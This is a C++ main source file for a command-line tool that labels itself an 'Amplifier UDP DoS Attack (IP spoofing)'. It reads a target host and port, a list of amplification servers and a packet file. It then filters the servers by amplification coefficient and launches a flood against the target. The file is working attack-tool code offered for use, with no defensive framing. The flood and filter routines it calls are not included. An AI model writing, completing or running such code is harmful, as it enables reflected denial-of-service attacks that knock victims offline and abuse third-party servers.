#include "serverFilter.h"
#include "flood.h"

#include <iostream>
#include <string>
#include <filesystem>
#include <fstream>
#include <list>
#include <memory>

void showUsage()
{
    std::cout
            << "Usage: app [target-IP] [target-port] [file with server list] [binary file with packet] [minimum coefficient amplification or 0 if you want to use all servers] [sleep ms]"
            << std::endl;
}

int main(const int argc, const char *const argv[]) {

    std::cout << "Amplifier UDP DoS Attack (IP spoofing)" << std::endl;

    if (argc == 2 && strcasecmp(argv[0], "--help") == 0)
    {
        showUsage();
        return EXIT_SUCCESS;
    }

    if (argc != 7) {
        std::cerr << "Invalid args" << std::endl;
        showUsage();
        return EXIT_FAILURE;
    }

    const char *const targetHost = argv[1];
    const auto targetPort = static_cast<uint16_t>(atoi(argv[2]));
    const char *const fileServerListPath = argv[3];
    const char *const binaryFilePacketPath = argv[4];
    const double minCof = atof(argv[5]);
    const auto sleepMs = static_cast<uint32_t>(atoi(argv[6]));

    try {
        // Check files
        if (!std::filesystem::exists(fileServerListPath))
            throw std::runtime_error("File with server list not found");

        if (!std::filesystem::exists(binaryFilePacketPath))
            throw std::runtime_error("Binary file with packet not found");

        // Get file size and check
        const size_t fileServersSz = std::filesystem::file_size(fileServerListPath);
        if (fileServersSz == 0)
            throw std::runtime_error("file with server list is empty");

        const size_t packetSz = std::filesystem::file_size(binaryFilePacketPath);
        if (packetSz == 0)
            throw std::runtime_error("Binary file with packet is empty");

        // Read binary file with packet
        std::ifstream filePacketStream(binaryFilePacketPath, std::ios::binary);
        if (!filePacketStream.is_open())
            throw std::runtime_error("Binary file with packet open error");

        std::unique_ptr <uint8_t> packet(new uint8_t[packetSz]);
        filePacketStream.read(reinterpret_cast<char *>(packet.get()), packetSz);
        filePacketStream.close();

        // Read server list
        std::list <ServeraAmplf> serverList;
        std::ifstream fileServerListStream(fileServerListPath, std::ios::binary);
        if (!fileServerListStream.is_open())
            throw std::runtime_error("File with server list open error");

        for (std::string itemString; getline(fileServerListStream, itemString);) {
            // Split string (host:port)
            ServeraAmplf server;
            const size_t pos = itemString.find(':');
            if (pos == std::string::npos) // Check format host:port
            {
                std::cerr << "Invalid item in server list: " << itemString << std::endl;
                continue;
            }
            server.host = std::move(itemString.substr(0, pos));

            const std::string &strPort = itemString.substr(pos + 1, itemString.length());
            server.port = static_cast<uint16_t>(atoi(strPort.c_str()));
            if (server.port == 0) {
                std::cerr << "Invalid item in server list: " << itemString << std::endl;
                continue;
            }

            // Add to list
            serverList.push_back(server);
        }

        fileServerListStream.close();

        std::cout << "Minimum coefficient amplification: "
                  << minCof
                  << std::endl
                  << "Search for servers that meet the conditions"
                  << std::endl
                  << "Servers count:"
                  << serverList.size()
                  << std::endl;

        double fullAmplCof = -1.0;
        if (minCof > 0.0)
            fullAmplCof = filterServers(serverList, minCof, packet.get(), packetSz);

        if (serverList.empty())
            throw std::runtime_error("no servers for amplification");

        const size_t filterServerListSz = serverList.size();

        std::cout << "Number of amplification servers: " << filterServerListSz << std::endl;

        if (fullAmplCof != -1.0)
            std::cout
                    << "Average coefficient amplification "
                    << (double) (fullAmplCof / ((double) filterServerListSz))
                    << std::endl;

        std::cout
            << "Full amplification server list:"
            << std::endl;

        for (const auto &server: serverList)
            std::cout << server.host << ":" << server.port << std::endl;

        std::cout
            << "Start attack on "
            << targetHost
            << ":"
            << targetPort
            << std::endl;

        flood(serverList, targetHost, targetPort, packet.get(), packetSz, sleepMs);
    }
    catch (const std::runtime_error &exception) {
        std::cerr << "Error: " << exception.what() << std::endl;
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
